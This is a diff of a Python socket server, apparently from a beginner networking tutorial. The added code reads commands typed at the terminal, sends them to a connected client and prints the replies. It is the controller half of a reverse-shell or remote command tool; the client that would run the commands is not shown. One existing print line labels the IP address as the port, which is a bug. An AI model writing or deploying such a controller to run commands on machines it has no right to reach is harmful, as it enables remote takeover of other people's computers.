@@ -44,3 +44,27 @@ def socket_accept():
     print("Connection has been established |" + "IP" + address[0] + " | Port" + str(address[0]))
     send_commands(conn)
     conn.close()
+
+
+#sends commands has to be constant
+def send_commands(conn):
+    while True: #we want this to work constant otherwise it run once 
+        cmd = input()#input from the terminal
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        #cmd typed on are stored in bytes you have to encode and decode.
+        #print to user has to bytes to be sent across the networksw
+        if len(str.encode(cmd)) > 0: #has to greather than 0 characters
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8") #when we get the response its gonna be in btyes so we have to convert to string
+            print(client_response, end="") #end="" dont give us a new line characred at the endd
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accept()
+    #we dont have to add the send_commands whenever connection accepted automatically calls teh send_commands
+
+main()
